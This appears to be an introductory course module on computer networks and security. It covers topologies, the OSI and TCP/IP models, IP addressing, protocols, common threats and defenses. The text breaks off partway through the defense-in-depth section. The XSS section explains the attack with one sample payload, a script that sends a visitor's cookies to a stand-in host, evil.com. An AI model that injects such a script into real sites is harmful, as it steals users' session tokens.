# CS 1111 – Introduction to Computer Science
## Module 6: Computer Networks and Security

---

## Table of Contents
1. [What is a Computer Network?](#1-what-is-a-computer-network)
2. [Types of Networks](#2-types-of-networks)
3. [Network Topologies](#3-network-topologies)
4. [Network Hardware](#4-network-hardware)
5. [The OSI Model](#5-the-osi-model)
6. [The TCP/IP Model](#6-the-tcpip-model)
7. [IP Addressing](#7-ip-addressing)
8. [Key Networking Protocols](#8-key-networking-protocols)
9. [The Internet and the World Wide Web](#9-the-internet-and-the-world-wide-web)
10. [Introduction to Network Security](#10-introduction-to-network-security)
11. [Common Cyber Threats](#11-common-cyber-threats)
12. [Security Mechanisms and Defenses](#12-security-mechanisms-and-defenses)
13. [Module Summary](#13-module-summary)
14. [Module Quiz](#14-module-quiz)

---

## 1. What is a Computer Network?

A **computer network** is a collection of two or more computing devices (computers, phones, servers, printers, IoT devices) connected together to **share resources, communicate, and exchange data**.

Without networks, every computer would be an isolated island. Networks enable:
- **Resource sharing:** Printers, storage, and software shared across many devices.
- **Communication:** Email, video calls, instant messaging.
- **Data sharing:** Files, databases, and applications accessed by multiple users.
- **Centralized management:** IT administrators manage all devices from one location.
- **The internet:** The global network of networks that connects billions of devices worldwide.

### Key Network Components

| Component | Role |
|---|---|
| **End devices** | Sources/destinations of data (PCs, phones, servers, printers) |
| **Intermediary devices** | Move data between end devices (routers, switches, hubs) |
| **Transmission media** | The physical or wireless path data travels (cables, Wi-Fi, fiber) |
| **Protocols** | Rules governing how data is formatted, transmitted, and received |

> **Analogy:** A network is like a postal system. End devices are houses (senders/receivers), intermediary devices are post offices and sorting centers (routers/switches), transmission media are roads (cables/wireless), and protocols are the rules for addressing envelopes and routing mail.

---

## 2. Types of Networks

Networks are classified by their **geographic scale** and **ownership**.

### 2.1 Personal Area Network (PAN)

The smallest type — connects devices within a person's immediate workspace (a few meters).

- **Technology:** Bluetooth, USB, NFC, Infrared.
- **Examples:** Smartphone connected to wireless earbuds; laptop connected to a smartwatch; phone pairing with a car.
- **Range:** ~1–10 meters.

### 2.2 Local Area Network (LAN)

Connects devices within a **single building or campus** — a home, office, school, or hospital.

- **Technology:** Ethernet (wired), Wi-Fi (wireless).
- **Ownership:** Privately owned and managed.
- **Speed:** Typically 100 Mbps to 10 Gbps.
- **Examples:** Home Wi-Fi network, a company's office network, a university campus network.
- **Range:** Up to ~1 km.

### 2.3 Metropolitan Area Network (MAN)

Covers a **city or metropolitan area** — larger than a LAN but smaller than a WAN.

- **Technology:** Fiber optic cables, WiMAX.
- **Examples:** City-wide Wi-Fi, cable TV networks, a university network spanning multiple campuses across a city.
- **Range:** ~5–50 km.

### 2.4 Wide Area Network (WAN)

Spans **large geographic distances** — countries or continents.

- **Technology:** Leased telephone lines, satellite links, fiber optic backbone cables.
- **Ownership:** Often managed by telecommunications providers.
- **Examples:** The **internet** is the largest WAN. A multinational company connecting its offices across different countries uses a private WAN.
- **Range:** Unlimited.

### 2.5 Wireless Local Area Network (WLAN)

A LAN that uses wireless technology (radio waves) instead of cables. Commonly called **Wi-Fi**.

- **Standard:** IEEE 802.11 (Wi-Fi 4, Wi-Fi 5, Wi-Fi 6, Wi-Fi 6E).
- **Examples:** Home routers, coffee shop hotspots, airport Wi-Fi.

### 2.6 Virtual Private Network (VPN)

A **VPN** creates a secure, encrypted "tunnel" over a public network (like the internet), making the connection behave like a private network.

- **Use cases:** Remote workers securely accessing company networks; bypassing geographic restrictions; protecting traffic on public Wi-Fi.

```
[Your Device] ──encrypted tunnel──> [VPN Server] ──> [Internet]
```

### 2.7 Network Type Summary

| Type | Scale | Example |
|---|---|---|
| PAN | ~10m | Bluetooth headphones |
| LAN | Building | Office Wi-Fi |
| MAN | City | City broadband network |
| WAN | Country/Globe | The Internet |
| WLAN | Building (wireless) | Home Wi-Fi |
| VPN | Any (virtual) | Remote work access |

---

## 3. Network Topologies

**Network topology** describes the **arrangement** of devices and connections in a network — both physical (how cables are laid) and logical (how data flows).

### 3.1 Bus Topology

All devices connect to a single central cable (the **bus**). Data sent by one device travels along the bus and all other devices receive it, but only the intended recipient processes it.

```
[PC1]──[PC2]──[PC3]──[PC4]──[PC5]
  ══════════════════════════════
              (Bus cable)
```

- **Pros:** Simple, inexpensive, easy to set up.
- **Cons:** A break in the main cable disables the entire network; performance degrades with more devices; all devices share the same bandwidth.
- **Use today:** Rarely used in modern networks; found in older Ethernet installations.

### 3.2 Star Topology

All devices connect to a central **hub or switch**. All communication goes through the central device.

```
         [PC1]
           │
[PC4] ──[Switch]── [PC2]
           │
         [PC3]
```

- **Pros:** Easy to add/remove devices; a single device failure doesn't affect others; easy to troubleshoot.
- **Cons:** If the central switch fails, the entire network goes down; requires more cabling.
- **Use today:** The **most common topology** in modern LANs (office and home networks).

### 3.3 Ring Topology

Devices connect in a closed loop. Data travels in one direction (or both in dual-ring) around the ring, passing through each device until it reaches the destination.

```
[PC1] → [PC2] → [PC3]
  ↑                ↓
[PC4] ← ─────────←─┘
```

- **Pros:** Equal access for all devices; predictable performance.
- **Cons:** A single failure can break the entire ring (unless dual-ring); adding/removing devices disrupts the network.
- **Use today:** Rarely used in LANs; still used in some fiber backbone networks (SONET rings).

### 3.4 Mesh Topology

Every device connects directly to every other device (full mesh) or to multiple devices (partial mesh), creating multiple paths for data.

```
[PC1]──[PC2]
  │ ╲  ╱ │
  │  ╲╱  │
  │  ╱╲  │
  │╱    ╲│
[PC4]──[PC3]
```

- **Pros:** Highly **fault-tolerant** — if one link fails, data reroutes through another path; no single point of failure.
- **Cons:** Expensive (many cables/connections); complex to manage.
- **Use today:** Internet backbone routers use partial mesh; used in critical infrastructure, military networks, and Wi-Fi mesh systems (Google Nest Wi-Fi).

### 3.5 Hybrid Topology

A combination of two or more topologies. Most real-world networks are hybrid.

> **Example:** A company might use star topology within each department (floors), connected via a backbone bus or ring between departments.

### 3.6 Topology Comparison

| Topology | Fault Tolerance | Cost | Complexity | Common Use |
|---|---|---|---|---|
| Bus | Low | Low | Low | Legacy networks |
| Star | Medium | Medium | Low | Modern LANs |
| Ring | Low-Medium | Medium | Medium | Fiber backbones |
| Mesh | High | High | High | Internet backbone |
| Hybrid | Variable | Variable | High | Enterprise networks |

---

## 4. Network Hardware

### 4.1 Network Interface Card (NIC)

Every device that connects to a network has a **NIC** — either built into the motherboard or as an expansion card. It converts data from the device into signals suitable for the network medium (electrical pulses for Ethernet, radio waves for Wi-Fi).

Each NIC has a globally unique **MAC address** (Media Access Control) — a 48-bit hardware identifier burned into the card at manufacture (e.g., `00:1A:2B:3C:4D:5E`).

### 4.2 Hub

A basic device that connects multiple devices on a LAN. It receives a signal from one port and **broadcasts** it to all other ports — every device receives every transmission, even if not the intended recipient.

- **Problem:** Creates unnecessary network traffic and is a security concern.
- **Status:** Largely obsolete, replaced by switches.

### 4.3 Switch

A smarter version of a hub. A switch learns the **MAC addresses** of devices on each port and forwards data **only to the intended recipient's port**. This reduces unnecessary traffic and improves security.

```
[PC1]──┐          ┌──[PC3]
       ├──[Switch]─┤
[PC2]──┘          └──[PC4]

When PC1 sends to PC3, ONLY PC3 receives it.
```

- **Layer:** Operates at Layer 2 (Data Link) of the OSI model.
- **Use:** The central device in almost every modern LAN (star topology).

### 4.4 Router

A router connects **different networks** together and determines the **best path** for data packets to travel from source to destination. Your home router connects your local home network (LAN) to the internet (WAN).

- **Layer:** Operates at Layer 3 (Network) of the OSI model.
- **Uses IP addresses** (not MAC addresses) to make routing decisions.
- **Additional features in home routers:** Switch, DHCP server, firewall, Wi-Fi access point — all in one device.

```
[Home LAN: 192.168.1.x] ──[Router]── [Internet (WAN)]
```

### 4.5 Access Point (AP)

A device that provides wireless (Wi-Fi) connectivity to a wired network. In homes, the router and access point are usually the same device. In enterprises, separate APs are deployed throughout a building for broad wireless coverage.

### 4.6 Modem

Converts signals between the digital format of your home network and the format used by your Internet Service Provider (ISP) — e.g., DSL over telephone lines, cable signals, or fiber optic signals.

**Signal flow in a typical home:**
```
Internet ──[ISP]──[Modem]──[Router]──[Switch/Wi-Fi AP]──[Devices]
```

### 4.7 Firewall

A security device (hardware or software) that **monitors and filters** incoming and outgoing network traffic based on security rules. It acts as a barrier between a trusted internal network and untrusted external networks.

- Blocks unauthorized access.
- Allows legitimate traffic through.
- Can be hardware (dedicated appliance) or software (Windows Firewall, iptables on Linux).

---

## 5. The OSI Model

When two devices communicate over a network, there are many complex tasks to coordinate: physical signal transmission, error detection, addressing, routing, session management, data formatting, and application interaction. The **OSI Model** (Open Systems Interconnection) organizes all these tasks into **7 layers**.

Each layer has a specific job and communicates with the layers directly above and below it. This **layered architecture** means a change in one layer doesn't require changes in others — for example, switching from Wi-Fi to Ethernet doesn't require changing your web browser.

### The 7 OSI Layers

```
Layer 7 │ Application  │ ← User-facing: HTTP, FTP, DNS, SMTP
Layer 6 │ Presentation │ ← Data format, encryption, compression
Layer 5 │ Session      │ ← Establish, manage, terminate sessions
Layer 4 │ Transport    │ ← Reliable delivery: TCP/UDP, ports
Layer 3 │ Network      │ ← Routing, IP addressing
Layer 2 │ Data Link    │ ← MAC addressing, frames, error detection
Layer 1 │ Physical     │ ← Bits on the wire: cables, signals, voltages
```

**Memory aid:** "**P**lease **D**o **N**ot **T**hrow **S**ausage **P**izza **A**way" (Physical → Data Link → Network → Transport → Session → Presentation → Application)

---

### Layer 1 – Physical

Responsible for transmitting raw **bits** (0s and 1s) over a physical medium.

- Defines electrical voltages, light pulses, or radio frequencies representing 0 and 1.
- Specifies cable types, connector shapes, signal timing.
- **Devices:** Cables (Ethernet, fiber optic), hubs, repeaters, Wi-Fi radio.
- **Unit of data:** **Bit**.

> **Example:** The RJ-45 Ethernet cable plugged into your computer and the voltage levels used to represent 0s and 1s are Layer 1 concerns.

---

### Layer 2 – Data Link

Provides **node-to-node** (device-to-device on the same network) data transfer. Packages bits into **frames**, detects errors in physical transmission, and uses **MAC addresses** to identify devices on a local network.

- Divided into two sublayers: **LLC** (Logical Link Control) and **MAC** (Media Access Control).
- **Devices:** Switches, NICs.
- **Unit of data:** **Frame**.
- **Protocols:** Ethernet, Wi-Fi (802.11), PPP.

---

### Layer 3 – Network

Responsible for **logical addressing** (IP addresses) and **routing** — determining the best path to deliver data from source to destination across multiple networks.

- **Devices:** Routers.
- **Unit of data:** **Packet**.
- **Protocols:** IP (IPv4, IPv6), ICMP (ping), ARP.

> **Key distinction:** Layer 2 gets data from device to device on the **same network** using MAC addresses. Layer 3 gets data from network to network across the **entire internet** using IP addresses.

---

### Layer 4 – Transport

Provides **end-to-end communication** between applications on different hosts. Handles:
- **Segmentation:** Breaking large data into smaller segments.
- **Reassembly:** Putting segments back together at the destination.
- **Reliability:** Ensuring all segments arrive and requesting retransmission of lost ones (TCP).
- **Flow control:** Managing transmission rate to prevent overwhelming the receiver.
- **Port numbers:** Identifying which application on the host should receive the data.

- **Unit of data:** **Segment** (TCP) / **Datagram** (UDP).
- **Protocols:** TCP, UDP.

---

### Layer 5 – Session

Manages **sessions** — logical connections between applications. Responsible for establishing, maintaining, and terminating communication sessions.

- **Protocols:** NetBIOS, RPC, SQL sessions, NFS.

> **Example:** When you log into a video call, the session layer establishes the session. If your Wi-Fi briefly drops, it attempts to restore the session when connectivity returns, rather than completely restarting.

---

### Layer 6 – Presentation

Handles **data translation, formatting, encryption, and compression** so that the application layer can interpret the data correctly, regardless of how the other end stored it.

- **Functions:** Character encoding (UTF-8, ASCII), data compression (JPEG, MP3), encryption/decryption (TLS/SSL operates here).
- **Example:** When your browser receives an HTTPS response, Layer 6 handles the TLS decryption so Layer 7 sees plain HTTP data.

---

### Layer 7 – Application

The layer **closest to the user** — provides network services directly to user applications. This is not the application itself (e.g., Chrome), but the protocols those applications use to communicate.

- **Protocols:** HTTP/HTTPS (web browsing), SMTP/POP3/IMAP (email), FTP (file transfer), DNS (domain name resolution), DHCP, SSH.
- **Unit of data:** **Message / Data**.

---

### Data Encapsulation

As data travels **down** the layers from sender to receiver, each layer **adds its own header** (and sometimes a trailer) — a process called **encapsulation**:

```
Application:   [  Data  ]
Transport:     [ TCP Hdr |  Data  ]
Network:       [ IP Hdr | TCP Hdr |  Data  ]
Data Link:     [ Eth Hdr | IP Hdr | TCP Hdr | Data | Eth Trlr ]
Physical:      [  0101001011010010010...  ]  (bits on the wire)
```

At the receiving end, each layer **strips** its header (de-encapsulation) and passes the remaining data up to the next layer.

---

## 6. The TCP/IP Model

The **TCP/IP model** (also called the Internet model) is the practical model that the internet actually uses. It is a simplified 4-layer version derived from OSI.

| TCP/IP Layer | Corresponding OSI Layers | Key Protocols |
|---|---|---|
| **Application** | OSI 5, 6, 7 | HTTP, HTTPS, DNS, SMTP, FTP, SSH |
| **Transport** | OSI 4 | TCP, UDP |
| **Internet** | OSI 3 | IP, ICMP, ARP |
| **Network Access** | OSI 1, 2 | Ethernet, Wi-Fi, fiber |

### TCP vs. UDP

The two workhorses of the Transport layer differ fundamentally in how they deliver data:

| Feature | TCP (Transmission Control Protocol) | UDP (User Datagram Protocol) |
|---|---|---|
| **Connection** | Connection-oriented (3-way handshake) | Connectionless |
| **Reliability** | Guaranteed delivery; retransmits lost packets | No guarantee; fire-and-forget |
| **Order** | Packets delivered in order | No ordering guarantee |
| **Speed** | Slower (overhead of reliability) | Faster (minimal overhead) |
| **Error checking** | Yes | Minimal |
| **Use cases** | Web browsing, email, file transfer, databases | Video streaming, gaming, DNS, VoIP |

#### The TCP 3-Way Handshake

Before TCP sends any data, it establishes a connection:

```
Client                          Server
  │──── SYN (I want to connect) ──→│
  │←─── SYN-ACK (OK, I'm ready) ───│
  │──── ACK (Great, let's go!)  ──→│
  │                                │
  │══════ Data flows both ways ════│
```

1. **SYN:** Client sends a synchronize request.
2. **SYN-ACK:** Server acknowledges and sends its own synchronize.
3. **ACK:** Client acknowledges — connection established.

---

## 7. IP Addressing

An **IP address** is a logical address assigned to every device on a network, used by routers to deliver packets to the correct destination.

### 7.1 IPv4

The original IP version. An IPv4 address is **32 bits** long, written as four **octets** (8-bit groups) in decimal, separated by dots.

```
Format:   [0-255].[0-255].[0-255].[0-255]
Example:  192.168.1.105
Binary:   11000000.10101000.00000001.01101001
```

Total possible addresses: 2³² = **~4.3 billion** — a number that has been essentially exhausted as the internet grew.

#### IP Address Classes (Classful Addressing — historical)

| Class | Range | Default Subnet Mask | Use |
|---|---|---|---|
| A | 1.0.0.0 – 126.255.255.255 | 255.0.0.0 (/8) | Very large networks |
| B | 128.0.0.0 – 191.255.255.255 | 255.255.0.0 (/16) | Medium networks |
| C | 192.0.0.0 – 223.255.255.255 | 255.255.255.0 (/24) | Small networks |

#### Private IP Addresses

Certain ranges are reserved for private networks (not routable on the public internet):

| Range | Common Use |
|---|---|
| `10.0.0.0 – 10.255.255.255` | Large private networks |
| `172.16.0.0 – 172.31.255.255` | Medium private networks |
| `192.168.0.0 – 192.168.255.255` | Home/small office networks |

> **Why does your home device have 192.168.1.x?** Your router assigns private IPs to all home devices. The router itself has one public IP from your ISP. When your devices access the internet, the router uses **NAT (Network Address Translation)** to map all private addresses to the single public IP — this also helped extend the life of IPv4.

---

### 7.2 IPv6

IPv6 was developed to solve IPv4 exhaustion. An IPv6 address is **128 bits** long, written as eight groups of four hexadecimal digits separated by colons.

```
Format:  xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx
Example: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
Short:   2001:db8:85a3::8a2e:370:7334  (leading zeros and :: for consecutive zero groups)
```

Total possible addresses: 2¹²⁸ = **~340 undecillion** — effectively inexhaustible (~340 trillion trillion trillion addresses).

---

### 7.3 Subnetting

**Subnetting** divides a large network into smaller **subnetworks (subnets)**. A **subnet mask** defines which part of an IP address is the **network portion** and which part is the **host portion**.

```
IP Address:   192.168.1.105
Subnet Mask:  255.255.255.0  (or /24 in CIDR notation)

Network:      192.168.1.0    (first 24 bits)
Host range:   192.168.1.1 – 192.168.1.254
Broadcast:    192.168.1.255  (last address)
```

**Why subnet?**
- Improves security by isolating network segments.
- Reduces unnecessary broadcast traffic.
- Efficient use of IP address space.

### 7.4 DHCP – Automatic IP Assignment

Manually assigning IPs to every device would be impractical. **DHCP (Dynamic Host Configuration Protocol)** automatically assigns IP addresses, subnet masks, default gateways, and DNS servers to devices when they join a network.

```
Device joins network → "I need an IP!" (DHCP Discover)
DHCP Server → "Here, take 192.168.1.105 for 24 hours" (DHCP Offer)
Device → "I'll take it!" (DHCP Request)
DHCP Server → "It's yours!" (DHCP Acknowledge)
```

---

## 8. Key Networking Protocols

### 8.1 DNS – Domain Name System

Humans remember names like `www.google.com`; computers need IP addresses like `142.250.80.4`. **DNS** is the internet's phonebook — it translates domain names into IP addresses.

```
You type: www.google.com
    ↓
DNS Resolver queries DNS servers
    ↓
Returns: 142.250.80.4
    ↓
Browser connects to 142.250.80.4
```

**DNS Hierarchy:**
```
Root DNS (.)
    ├── .com TLD (Top-Level Domain)
    │     └── google.com (Authoritative DNS)
    │              └── www.google.com → 142.250.80.4
    ├── .org TLD
    └── .mx TLD
```

### 8.2 HTTP and HTTPS

**HTTP (HyperText Transfer Protocol)** governs how web browsers and servers communicate — request a web page, receive HTML back.

**HTTPS** = HTTP + **TLS (Transport Layer Security)** encryption. All data is encrypted so eavesdroppers cannot read it.

```
HTTP Request:  GET /index.html HTTP/1.1
               Host: www.example.com

HTTP Response: HTTP/1.1 200 OK
               Content-Type: text/html
               [HTML content follows...]
```

Common HTTP status codes:

| Code | Meaning |
|---|---|
| 200 | OK — Request succeeded |
| 301 | Moved Permanently — Redirect |
| 404 | Not Found — Resource doesn't exist |
| 403 | Forbidden — No permission |
| 500 | Internal Server Error — Server-side problem |

### 8.3 SMTP, POP3, IMAP – Email Protocols

| Protocol | Role |
|---|---|
| **SMTP** (Simple Mail Transfer Protocol) | Sending email from client to server, and server to server |
| **POP3** (Post Office Protocol v3) | Downloading email to client; removes it from server |
| **IMAP** (Internet Message Access Protocol) | Accessing email on server; keeps mail on server; syncs across devices |

> **Why IMAP over POP3?** IMAP lets you read email on your phone and laptop simultaneously, with the same state. POP3 downloads and deletes from the server, so only one device has the mail.

### 8.4 FTP and SFTP

- **FTP (File Transfer Protocol):** Transfers files between client and server. Transmits data in plaintext — insecure.
- **SFTP (SSH File Transfer Protocol):** FTP over an encrypted SSH connection — the secure modern alternative.

### 8.5 SSH – Secure Shell

Provides **encrypted remote access** to a computer's command line over a network. The standard way system administrators manage remote servers.

```bash
# Connect to a remote server securely
ssh username@server_ip_address

# Example
ssh ana@192.168.1.200
```

### 8.6 Protocol Port Numbers

**Port numbers** identify which application/service a packet is intended for on a host. Think of an IP address as a building's street address and a port number as the specific apartment number.

| Protocol | Port Number |
|---|---|
| FTP | 21 |
| SSH | 22 |
| SMTP | 25 |
| DNS | 53 |
| HTTP | 80 |
| HTTPS | 443 |
| POP3 | 110 |
| IMAP | 143 |
| RDP (Remote Desktop) | 3389 |
| MySQL | 3306 |

---

## 9. The Internet and the World Wide Web

### 9.1 The Internet

The **internet** is a global system of interconnected networks — a "network of networks" — using the TCP/IP protocol suite to communicate. It is a physical infrastructure of cables, routers, switches, and wireless links.

**Brief history:**
- **ARPANET (1969):** US military research network, the internet's precursor.
- **TCP/IP standardized (1983):** The common language of the internet.
- **World Wide Web invented (1989):** Tim Berners-Lee at CERN — enabled documents to be linked and shared over the internet.
- **First web browser (1993):** Mosaic — made the web accessible to the public.
- **Today:** ~5.5 billion internet users; billions of connected IoT devices.

### 9.2 The World Wide Web (WWW)

The **Web** is a **service that runs on top of the internet** — it is the system of interlinked hypertext documents and resources accessed via browsers using HTTP/HTTPS. The internet is the infrastructure; the web is one of many services that uses it (alongside email, VoIP, online gaming, etc.).

```
Internet ⊃ { World Wide Web, Email, VoIP, Gaming, Streaming, ... }
```

### 9.3 How a Web Page Loads (End-to-End)

```
1. You type "www.amazon.com" in the browser
2. DNS lookup → IP address: 205.251.242.103
3. TCP 3-way handshake with Amazon's server
4. TLS handshake (HTTPS encryption negotiated)
5. Browser sends HTTP GET request
6. Server sends back HTML, CSS, JavaScript
7. Browser parses and renders the page
8. Browser makes additional requests for images, fonts, scripts
```

### 9.4 Cloud Computing

**Cloud computing** delivers computing resources (servers, storage, databases, software) over the internet on a pay-as-you-go basis.

| Model | Description | Examples |
|---|---|---|
| **IaaS** (Infrastructure as a Service) | Rent virtual servers, storage, networking | AWS EC2, Azure VMs, Google Compute Engine |
| **PaaS** (Platform as a Service) | Platform for building/deploying apps | Heroku, Google App Engine, Azure App Service |
| **SaaS** (Software as a Service) | Ready-to-use software over the internet | Gmail, Office 365, Salesforce, Zoom |

---

## 10. Introduction to Network Security

Network security is the practice of **protecting computer networks and their data** from unauthorized access, misuse, malfunction, modification, or disruption.

### 10.1 The CIA Triad

The foundational framework of information security:

```
           Confidentiality
                ▲
               / \
              /   \
             /     \
            /  CIA  \
           /  Triad  \
          /___________\
    Integrity       Availability
```

| Principle | Meaning | Example Threat |
|---|---|---|
| **Confidentiality** | Information is accessible only to authorized parties | Data breach, eavesdropping |
| **Integrity** | Data is accurate and has not been tampered with | Man-in-the-middle attack, data corruption |
| **Availability** | Systems and data are accessible when needed | DDoS attack, ransomware |

Every security measure is designed to protect one or more of these three properties.

### 10.2 The Attack Surface

The **attack surface** is the total number of entry points an attacker could exploit — network ports, software vulnerabilities, user accounts, physical access, email, web applications, and more. Good security practice aims to **minimize the attack surface**.

### 10.3 Threat Actors

| Actor | Motivation | Sophistication |
|---|---|---|
| **Script kiddies** | Fun, notoriety | Low |
| **Cybercriminals** | Financial gain | Medium-High |
| **Hacktivists** | Political/social agenda | Medium |
| **Insider threats** | Revenge, financial, negligence | Varies |
| **Nation-state actors** | Espionage, disruption | Very High |

### 10.4 Security Terminology

| Term | Definition |
|---|---|
| **Vulnerability** | A weakness in a system that could be exploited |
| **Exploit** | Code or technique that takes advantage of a vulnerability |
| **Threat** | A potential danger that could exploit a vulnerability |
| **Risk** | The likelihood × impact of a threat exploiting a vulnerability |
| **Patch** | A software update that fixes a vulnerability |
| **Zero-day** | A vulnerability that is unknown to the vendor and has no patch |

---

## 11. Common Cyber Threats

### 11.1 Malware (Malicious Software)

**Malware** is any software designed to harm, disrupt, or gain unauthorized access to a system.

#### Virus
Malicious code that **attaches itself to legitimate programs** and spreads when those programs are executed. Requires user action to spread (e.g., running an infected file).

#### Worm
A **self-replicating** malware that spreads automatically across networks **without user interaction**, exploiting network vulnerabilities.

> **Example:** The **WannaCry worm** (2017) exploited the EternalBlue Windows vulnerability to spread automatically across networks, encrypting files on hundreds of thousands of computers in 150 countries within days.

#### Trojan Horse
Malware disguised as legitimate, useful software. The user installs it voluntarily, not knowing it contains malicious code.

> **Example:** A user downloads what appears to be a free game — it installs fine, but silently also installs a keylogger.

#### Ransomware
Encrypts the victim's files and **demands payment (ransom)** — usually in cryptocurrency — for the decryption key.

> **Real-world impact:** The Colonial Pipeline ransomware attack (2021) caused fuel shortages across the US East Coast and resulted in a $4.4 million ransom payment.

#### Spyware
Secretly monitors the user's activity — browsing history, keystrokes, screenshots, webcam — and sends data to the attacker.

#### Keylogger
Records every keystroke made on a keyboard, capturing passwords, credit card numbers, and private messages.

#### Rootkit
Malware designed to gain **root/admin access** and hide itself from detection, allowing persistent, deep control of the system.

#### Botnet
A network of malware-infected computers (**bots / zombies**) controlled remotely by an attacker (**botmaster**). Used to send spam, perform DDoS attacks, or mine cryptocurrency.

---

### 11.2 Phishing

A **social engineering** attack where attackers impersonate legitimate entities (banks, tech companies, employers) via fake emails, websites, or messages to trick users into revealing sensitive information or clicking malicious links.

**Types:**
- **Spear phishing:** Targeted at a specific individual, personalized with their name/details.
- **Whaling:** Targets high-profile executives (CEOs, CFOs).
- **Smishing:** Phishing via SMS text messages.
- **Vishing:** Phishing via voice calls.

**Example phishing email:**
```
From: security@paypa1.com  ← Notice the "1" instead of "l"
Subject: Urgent: Your account has been suspended

Dear Customer,

Your PayPal account has been limited due to suspicious activity.
Please verify your account immediately:

[Click here to verify] → http://paypal-secure-login.xyz/verify

Failure to verify within 24 hours will result in permanent suspension.
```

**Red flags:** Urgency, generic greeting, misspelled domain, suspicious link.

---

### 11.3 Man-in-the-Middle (MitM) Attack

The attacker secretly **intercepts and potentially alters** communication between two parties who believe they are communicating directly with each other.

```
Alice ──→ [Attacker intercepts] ──→ Bob
Alice ←── [Attacker intercepts] ←── Bob
```

- **Example scenarios:** Intercepting unencrypted HTTP traffic on public Wi-Fi; ARP poisoning on a local network.
- **Prevention:** Always use HTTPS/TLS; avoid sensitive activities on public Wi-Fi; use VPN.

---

### 11.4 Denial of Service (DoS) and Distributed DoS (DDoS)

A **DoS attack** floods a server or network with so much traffic that it becomes overwhelmed and unable to serve legitimate users — it "denies service."

A **DDoS (Distributed DoS)** uses thousands or millions of compromised computers (a botnet) to flood the target simultaneously, making it much harder to block.

```
Botnet (millions of zombies) ──→→→ Flood traffic ──→→→ [Target Server OVERWHELMED]
```

> **Example:** In 2016, the Mirai botnet (composed of hacked IoT devices like security cameras and DVRs) launched a massive DDoS attack on Dyn DNS, taking down major websites including Twitter, Netflix, and Reddit for hours.

---

### 11.5 SQL Injection (Network Context)

As covered in Module 5 — malicious SQL injected through web forms or URLs to manipulate the database. A critical threat to web applications.

---

### 11.6 Cross-Site Scripting (XSS)

An attacker injects malicious **JavaScript** into a trusted website. When other users visit the page, the script runs in their browser, stealing cookies, session tokens, or redirecting them.

```html
<!-- Vulnerable comment field accepts: -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

---

### 11.7 Password Attacks

| Attack | Description |
|---|---|
| **Brute force** | Try every possible password combination |
| **Dictionary attack** | Try words from a list of common passwords |
| **Credential stuffing** | Use leaked username/password pairs from other breaches |
| **Rainbow table** | Use precomputed hash tables to reverse password hashes |

---

## 12. Security Mechanisms and Defenses

### 12.1 Firewalls

As introduced in Section 4.7, firewalls filter network traffic based on rules. Types:

- **Packet filtering:** Inspects individual packets (IP, port, protocol) — fast but limited.
- **Stateful inspection:** Tracks the state of connections; allows only packets that are part of an established connection.
- **Application-layer (proxy) firewall:** Inspects packet contents at the application level — detects malicious content in HTTP, FTP, etc.
- **Next-Generation Firewall (NGFW):** Combines all the above + intrusion prevention, deep packet inspection, application awareness.

### 12.2 Encryption

Converts plaintext data into unreadable **ciphertext** using an algorithm and key. Only parties with the correct key can decrypt it.

**Symmetric encryption:** Same key for encryption and decryption.
```
Plaintext + Key → [AES Cipher] → Ciphertext
Ciphertext + Key → [AES Cipher] → Plaintext
```
- Fast; used for bulk data encryption.
- **Algorithms:** AES (Advanced Encryption Standard) — the gold standard; DES (obsolete).

**Asymmetric encryption (Public-Key Cryptography):** Two mathematically linked keys — a **public key** (shared freely) and a **private key** (kept secret).
```
Alice's public key  → encrypts data → only Alice's private key can decrypt
Alice's private key → signs data    → anyone with Alice's public key can verify
```
- Used for key exchange, digital signatures, HTTPS.
- **Algorithms:** RSA, ECC (Elliptic Curve Cryptography).

#### TLS/SSL – Securing Web Traffic

**TLS (Transport Layer Security)** is the protocol that secures HTTPS connections. It uses asymmetric encryption to exchange keys, then symmetric encryption (AES) for the actual data transfer.

```
1. Browser requests HTTPS page
2. Server sends its TLS certificate (contains public key)
3. Browser verifies certificate with Certificate Authority (CA)
4. Keys exchanged using asymmetric encryption
5. Symmetric session key established
6. All subsequent data encrypted with AES (fast)
```

The padlock icon in your browser = TLS is active and the connection is encrypted.

### 12.3 Authentication Mechanisms

**Multi-Factor Authentication (MFA)** requires at least two of the following:

| Factor | Type | Example |
|---|---|---|
| Something you **know** | Knowledge | Password, PIN |
| Something you **have** | Possession | Phone OTP, security key (YubiKey) |
| Something you **are** | Inherence | Fingerprint, Face ID |

> Even if an attacker steals your password, they cannot log in without your second factor (e.g., your phone). MFA blocks ~99.9% of automated account takeover attacks.

### 12.4 Intrusion Detection and Prevention Systems (IDS/IPS)

- **IDS (Intrusion Detection System):** Monitors network traffic and alerts when suspicious activity is detected. It is **passive** — it observes and reports.
- **IPS (Intrusion Prevention System):** Like IDS but **active** — it automatically blocks detected threats in real time.

Detection methods:
- **Signature-based:** Compares traffic against known attack patterns (fast, but misses new attacks).
- **Anomaly-based:** Establishes a baseline of normal behavior; flags deviations (catches new attacks, but more false positives).

### 12.5 VPN (Virtual Private Network)

Encrypts all traffic between a device and a VPN server, protecting data from eavesdropping — especially important on public Wi-Fi. Also hides the user's real IP address.

### 12.6 Public Key Infrastructure (PKI) and Digital Certificates

When you connect to `https://bank.com`, how does your browser know it's really the bank and not an impostor?

A **digital certificate** is a document signed by a trusted **Certificate Authority (CA)** that binds a public key to an identity (domain name, organization). Your browser comes pre-installed with a list of trusted CAs.

```
bank.com's certificate says:
"I am bank.com, my public key is [xxxxx],
and DigiCert (CA) has verified and signed this."

Browser checks: DigiCert is trusted → Certificate is valid → Connection is secure
```

### 12.7 Security Best Practices

**For users:**
- Use **strong, unique passwords** for every account (use a password manager).
- Enable **MFA** on all important accounts.
- Keep **software and OS updated** (patches fix known vulnerabilities).
- Be suspicious of **unexpected emails, links, and attachments**.
- Use **HTTPS** websites for sensitive activities.
- Avoid **public Wi-Fi** for banking/sensitive tasks (or use a VPN).
- **Back up data** regularly using the 3-2-1 rule.

**For organizations:**
- Apply the **Principle of Least Privilege** (Module 4 — give users only the access they need).
- Conduct regular **security audits and penetration testing**.
- Train employees on **security awareness** (phishing simulations).
- Implement **network segmentation** — isolate critical systems.
- Have an **Incident Response Plan** for when breaches occur.
- Monitor with **SIEM** (Security Information and Event Management) systems.

### 12.8 Summary: Defense in Depth

No single security measure is sufficient. **Defense in depth** layers multiple security controls so that if one fails, others still protect the system:

```
┌────────────────────────────────────────────┐
